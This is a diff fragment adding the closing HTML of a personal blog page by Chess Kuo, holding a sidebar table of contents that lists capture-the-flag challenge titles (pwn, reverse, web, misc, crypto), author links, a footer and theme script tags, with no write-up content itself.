+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome-BOF"><span class="nav-number">1.1.</span> <span class="nav-text">Welcome BOF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ORW"><span class="nav-number">1.2.</span> <span class="nav-text">ORW</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trivial"><span class="nav-number">2.1.</span> <span class="nav-text">Trivial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TsaiBro"><span class="nav-number">2.2.</span> <span class="nav-text">TsaiBro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HolyGrenade"><span class="nav-number">2.3.</span> <span class="nav-text">HolyGrenade</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleWindow"><span class="nav-number">3.1.</span> <span class="nav-text">SimpleWindow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden"><span class="nav-number">3.2.</span> <span class="nav-text">Hidden</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d1v1n6"><span class="nav-number">3.3.</span> <span class="nav-text">d1v1n6</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">4.1.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KcufsJ"><span class="nav-number">4.2.</span> <span class="nav-text">KcufsJ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Are-you-admin"><span class="nav-number">4.3.</span> <span class="nav-text">Are you admin?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pysh"><span class="nav-number">4.4.</span> <span class="nav-text">Pysh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crystal-Maze"><span class="nav-number">4.5.</span> <span class="nav-text">Crystal Maze</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TCash"><span class="nav-number">5.1.</span> <span class="nav-text">TCash</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Chess Kuo"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Chess Kuo</p>
+  <div class="site-description" itemprop="description">與其擔心被批評，</br>不如想辦法被敬佩。</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gyc880323" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gyc880323" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:me@chesskuo.tw" title="E-Mail → mailto:me@chesskuo.tw" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chess Kuo</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
